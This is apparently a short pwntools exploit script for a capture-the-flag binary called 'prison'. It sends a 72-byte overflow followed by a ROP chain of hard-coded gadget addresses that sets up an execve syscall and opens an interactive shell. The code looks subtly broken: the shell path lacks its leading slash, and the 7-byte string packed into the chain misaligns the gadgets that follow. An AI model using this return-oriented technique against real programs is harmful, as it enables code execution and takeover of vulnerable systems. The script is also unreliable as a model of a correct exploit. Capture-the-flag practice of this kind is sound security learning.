from pwn import *
#p = remote()
p = process("./prison")
p = gdb.debug("./prison","b *0x0000000000401b4c")
context.log_level = "debug"
context.arch ="amd64"
'''

execve("bin/sh")

rax = 0x3b
rdi = address of "bin/sh"
rsi = 0x0
rdx = 0x0
'''
syscall = 0x00000000004013b8
binsh = b'bin/sh' + b'\x00'
rwpage = 0x00000000004cb000
mov_rsi_rax = 0x0000000000434f55
pop_rdx = 0x0000000000401a1a
pop_rsi_pop_rbp = 0x0000000000413676
pop_rdi = 0x0000000000401a0d
pop_rax = 0x000000000041f464

payload = b'a' * 64 + B'B' * 8 + p64(pop_rsi_pop_rbp) + p64(rwpage) +p64(0x0)+ p64(pop_rax)+ binsh  + p64(mov_rsi_rax)+p64(pop_rdi) + p64(rwpage)+ p64(pop_rdx) + p64(0x0)+p64(pop_rsi_pop_rbp) + p64(0x0)+p64(0x0)+ p64(pop_rax) + p64(0x3b) + p64(syscall)

p.sendlineafter("They gave you the premium stay so at least you get to choose your cell (1-6): ",str(1))
p.sendlineafter("Now let's get the registry updated. What is your name: ",payload)

p.interactive()